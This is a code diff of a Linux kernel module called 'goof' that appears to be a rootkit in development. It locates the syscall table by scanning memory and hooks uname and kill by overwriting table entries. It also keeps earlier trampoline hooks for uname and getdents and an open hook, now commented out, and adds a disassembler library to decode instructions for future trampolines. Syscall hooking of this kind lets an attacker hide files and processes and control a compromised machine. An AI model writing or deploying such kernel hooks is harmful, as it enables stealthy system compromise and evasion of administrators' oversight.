@@ -8,7 +8,8 @@ Task:
 
 #include "goof.h"
 #include "user.h"
-
+#include <include/beaengine/BeaEngine.h>
+#include <beaengineSources/BeaEngine.c>
 
 
 // Iterate over the entire possible range until you find some __NR_close
@@ -394,41 +395,54 @@ goof_init(void) {
 	//kobject_del(&THIS_MODULE->mkobj.kobj);
 
 	printk("[goof] module loaded\n");
+	
+	//Initialize disasm
+	DISASM MyDisasm;
+	int len = 0;
+	int Error = 0;
+
+	(void) memset(&MyDisasm, 0, sizeof(DISASM));
 
 	hooks = kmalloc(sizeof(struct Hook *)*HOOKS_COUNT, GFP_KERNEL);
 
 	//Find base syscall address	
 	__sys_call_table = find(); 
+	printk("Found table\n");
 
 	//Update table with hooked code
 	//Regular way to hook syscall
-	//original_uname = __sys_call_table[__NR_uname];
-	//__sys_call_table[__NR_uname] = goofy_uname;
-
+	original_uname = __sys_call_table[__NR_uname];
+	__sys_call_table[__NR_uname] = goofy_uname;
+	printk("Hooked uname\n");
 	//Trampolining way to overwrite syscall  
-	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
-	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
+	//create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
+	//create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
 	
 	//Waiting on LDE+ to create these into trampoline hooks
 	//LDE+ needed  bto check if instruction is relative jump that needs to be decoded.
 	original_kill = __sys_call_table[__NR_kill];
 	__sys_call_table[__NR_kill] = goofy_kill;
+	printk("Hooked kill\n");
 
-	original_open = __sys_call_table[__NR_open];
-	__sys_call_table[__NR_open] = goofy_open;
+	//original_open = __sys_call_table[__NR_open];
+	//__sys_call_table[__NR_open] = goofy_open;
 
 	//NO - waiting on an LDE @Scott Court
 	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
 	//Creating a new trampoline - DEBUG
 	
 	printk("[goof] DEBUG\n ");
-	unsigned char *ptr_tmp = (unsigned char *)__sys_call_table[__NR_kill];
-	for(int i = 0; i < 32; i++){
-		printk("%02x ", ptr_tmp[i]);
+	//unsigned char *ptr_tmp = (unsigned char *)__sys_call_table[__NR_uname];
+/*	for(int i = 0; i < 32; i++){
+		MyDisasm.EIP = __sys_call_table[__NR_uname]; //(UIntPtr) ptr_tmp[i];
+		len = Disasm(&MyDisasm);
+		printk("len: %d\n", len);
+		//for(int j = 0; j < len; j++){
+		//	printk("%02x ", ptr_tmp[i+j]);
+		//}
+		//printk("\n");
 	}
-	printk("\n");
-
-
+*/
 	return 0;
 }
 static void __exit
@@ -439,7 +453,8 @@ goof_exit(void) {
 
 
 	__sys_call_table[__NR_kill] = original_kill;
-	__sys_call_table[__NR_open] = original_open;
+	__sys_call_table[__NR_uname] = original_uname;
+	//__sys_call_table[__NR_open] = original_open;
 
 	//remove_tramp(2);
 	printk("[goof] module removed\n");
